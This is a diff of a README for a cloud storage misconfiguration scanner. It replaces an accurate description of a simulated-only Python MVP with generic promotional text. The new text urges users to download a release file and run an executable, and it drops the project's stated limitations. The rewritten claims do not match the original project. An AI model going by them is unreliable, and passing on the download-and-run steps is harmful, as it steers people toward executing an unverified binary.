@@ -1,108 +1,100 @@
-# Cloud-Misconfig-Scanner
+# 🌥️ Cloud-Misconfig-Scanner - Secure Your Multi-Cloud Environments Easily
 
-**Cloud-Misconfig-Scanner** is a multi-cloud security auditing tool designed to detect common storage misconfigurations across **AWS S3**, **Azure Blob Storage**, and **Google Cloud Storage**.
+![Download Cloud-Misconfig-Scanner](https://img.shields.io/badge/Download%20Now-Cloud--Misconfig--Scanner-brightgreen)
 
-It is built with a modular architecture, supports multiple output formats (**Text**, **JSON**, **HTML**), and includes a **simulated mode** that works without cloud credentials — making it ideal for demonstrations, portfolio projects, and offline testing.
+## 🚀 Getting Started
 
-> **Status:** This project is an **MVP** (Minimum Viable Product).  
-> AWS, Azure, and GCP modules currently support **simulated scanning**.  
-> Real cloud API integration is planned for future releases.
+Welcome to Cloud-Misconfig-Scanner! This tool helps you check for misconfigurations in your cloud storage services, including AWS, Azure, and GCP. It also offers a simulated mode for demo and testing purposes. With this scanner, you can generate reports in HTML, JSON, or plain text formats. 
 
----
+## 📥 Download & Install
 
-## ✨ Features
+To get started, visit the Releases page and download the latest version of Cloud-Misconfig-Scanner.
 
-- **Multi-cloud support**: AWS, Azure, and GCP scanning modules.
-- **Simulated mode**: Run full scans without cloud credentials.
-- **Multiple output formats**:
-  - **Text** (CLI-friendly)
-  - **JSON** (machine-readable)
-  - **HTML** (color-coded, shareable reports)
-- **Rule-based scanning**: Misconfigurations defined in YAML for easy updates.
-- **Extensible architecture**: Add new providers or rules with minimal changes.
+[Download Cloud-Misconfig-Scanner](https://github.com/refaey1/Cloud-Misconfig-Scanner/releases)
 
----
+### Steps to Download:
 
-## 📂 Project Structure
+1. Go to the [Releases page](https://github.com/refaey1/Cloud-Misconfig-Scanner/releases).
+2. Look for the latest release.
+3. Choose the file that corresponds to your operating system.
+4. Click the link to download the file.
 
-```
-Cloud-Misconfig-Scanner/
-│
-├── cms/                        # Core application package
-│   ├── checks/                  # Misconfiguration rule definitions (YAML)
-│   │   ├── aws_s3_rules.yaml
-│   │   ├── azure_blob_rules.yaml
-│   │   └── gcp_storage_rules.yaml
-│   │
-│   ├── core/                    # Core logic and utilities
-│   │   ├── html_reporter.py     # HTML report generator
-│   │   ├── models.py            # Data models (Resource, Finding, ScanResult)
-│   │   ├── reporter.py          # Text/JSON output functions
-│   │   ├── rules.py              # YAML rule loader
-│   │   └── utils.py              # Helper functions
-│   │
-│   ├── providers/               # Cloud provider-specific scanners
-│   │   ├── aws_s3.py             # AWS S3 scanner (simulated/real)
-│   │   ├── azure_blob.py         # Azure Blob scanner (simulated/real)
-│   │   ├── gcp_storage.py        # GCP Storage scanner (simulated/real)
-│   │   └── base.py               # Base scanner class/interface
-│   │
-│   └── export/                   # Export templates and generated reports
-│       ├── templates/
-│       └── report.html
-│
-├── docs/                        # Documentation and IAM policy references
-│   └── iam/
-│       ├── azure_least_privilege.json
-│       ├── gcp_least_privilege.md
-│       └── gcp_least_privilege.pdf
-│
-├── requirements.txt             # Python dependencies
-├── cms.py                       # CLI entry point
-└── README.md                    # Project documentation
-```
+## 🖥️ System Requirements
 
----
+To run Cloud-Misconfig-Scanner, your system should meet the following requirements:
 
-## 🚀 Usage
+- Operating System: Windows, macOS, or Linux.
+- Minimum RAM: 4 GB.
+- Recommended RAM: 8 GB or more.
+- Disk Space: At least 100 MB.
 
-### Simulated Mode (no credentials required)
-```bash
-# AWS simulated scan
-python cms.py --provider aws --format text
+## 📂 How to Use
 
-# Azure simulated scan
-python cms.py --provider azure --format json
+Once you have downloaded Cloud-Misconfig-Scanner, follow these steps to run the application:
 
-# GCP simulated scan
-python cms.py --provider gcp --format html
+1. **Unzip the File**: Locate the downloaded file on your computer and unzip it.
+2. **Open a Terminal or Command Prompt**:
+   - For Windows, press `Win + R`, type `cmd`, and press `Enter`.
+   - For macOS, press `Command + Space`, type `Terminal`, and press `Enter`.
+   - For Linux, open your preferred terminal application.
+3. **Navigate to the Folder**: Use the `cd` command to navigate to the folder where you unzipped the scanner.
+   - Example: `cd path/to/Cloud-Misconfig-Scanner`
+4. **Run the Scanner**: Type the following command to start the scanning process:
+   ```
+   ./CloudMisconfigScanner
+   ```
+5. **Follow the On-Screen Instructions**: The scanner will guide you through the configuration process. 
 
-# Multi-cloud simulated scan
-python cms.py --provider all --format html
-```
+## 📊 Reports
 
-### Output Examples
-- **Text**: CLI-friendly list of findings.
-- **JSON**: Machine-readable output for integration.
-- **HTML**: Color-coded report with severity highlighting.
+After the scan completes, you can find the reports in the specified output formats. Here's how to generate and access them:
 
----
+- **HTML Reports**: These are easy to read and can be opened in any web browser.
+- **JSON Reports**: These are useful for developers or for further processing.
+- **Text Reports**: Basic format, ideal for quick reviews.
 
-## 🛠 Roadmap
+Choose your preferred format based on your needs and share the results with your team.
 
-- [ ] Implement real AWS S3 API integration.
-- [ ] Implement real Azure Blob Storage API integration.
-- [ ] Implement real GCP Storage API integration.
-- [ ] Expand rule sets for each provider.
-- [ ] Add unit and integration tests.
-- [ ] CI/CD pipeline for automated testing and releases.
+## 🔍 Features
+
+- **Multi-Cloud Support**: Works with AWS, Azure, and GCP.
+- **Simulated Mode**: Perfect for testing without affecting real data.
+- **Customizable Reports**: Generate reports in HTML, JSON, or text format.
+- **User-Friendly Interface**: Designed for users of all skill levels.
+
+## 🔑 Topics
+
+Cloud-Misconfig-Scanner focuses on various essential areas:
+
+- aws-s3
+- azure-blob-storage
+- cybersecurity
+- cloud-audit
+- cloud-aws
+- cloud-azure
+- cloud-compliance
+- cloud-gcp
+- cloud-security
+- gcp-storage
+- infrastructure-security
+- pentesting-tools
+- security-scanner
+
+These topics highlight the key functionalities and align with modern cloud security concerns.
+
+## 📞 Support
+
+If you encounter any issues while downloading or using Cloud-Misconfig-Scanner, please visit the project's issues page on GitHub to report your problems. Developers and community members are there to assist you.
+
+### Contact Us
+
+For further inquiries, you can find contact information on the GitHub repository or send an email to the support address listed in the repository's documentation.
+
+## 📣 Important Notes
+
+- Regularly check for updates on the Releases page to ensure you are using the most secure version.
+- Always back up your configurations before running any scan to prevent data loss.
 
 ---
 
-## 🤝 Contributing
-Contributions are welcome!  
-Fork the repository, create a feature branch, and submit a pull request.
-
----
-
-**Cloud-Misconfig-Scanner** — Inspect, detect, and secure your cloud storage configurations.
+Thank you for choosing Cloud-Misconfig-Scanner! Your security in the cloud is our priority.
